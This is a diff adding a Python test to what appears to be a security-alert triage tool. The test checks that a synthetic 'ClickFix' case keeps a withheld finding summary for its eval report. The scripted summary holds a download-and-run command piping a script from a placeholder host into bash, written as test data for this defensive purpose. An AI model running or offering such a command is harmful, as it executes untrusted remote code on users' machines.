@@ -263,3 +263,27 @@ def test_high_rule_benign_without_warden_is_flagged(tmp_path):
                  model=ScriptedClient(script), edge=ReplayEdge(case), store=CoreStore(":memory:"))
     assert inc.decision.verdict == Verdict.SUSPICIOUS and inc.decision.notify
     assert "second review couldn't run" in inc.decision.summary
+
+
+def test_withheld_summary_is_kept_for_the_eval_report(tmp_path):
+    """The real-API eval on Nov 23 failed three cases on hygiene but couldn't show why."""
+    from bastion.core.synthetic import run_synthetic
+
+    case = next(c for c in CASES if c["id"] == "T1-clickfix-curl-sh")
+
+    def script(model, system, messages, tools, force_tool):
+        from bastion.core.models import ModelReply, ToolCall, Usage
+        if force_tool == "submit_decision" or "submit_decision" in tools:
+            return ModelReply("", tool_calls=[ToolCall("d", "submit_decision", {
+                "verdict": "malicious", "confidence": 0.9, "severity": "high",
+                "headline": "Pasted command ran a downloaded script", "summary": "s",
+                "notify": True})], usage=Usage(1, 1))
+        return ModelReply("", tool_calls=[ToolCall("f", "submit_finding", {
+            "verdict": "malicious", "confidence": 0.9, "reasoning": "r",
+            "summary": "bash ran curl -fsSL https://x.example/fix.sh | bash"})],
+            usage=Usage(1, 1))
+
+    [r] = run_synthetic(settings=Settings(data_dir=tmp_path), model=ScriptedClient(script),
+                        cases=[case])
+    assert not r["ok"] and not r["checks"]["hygiene"]
+    assert any("withheld summary: bash ran curl" in n for n in r["notes"])
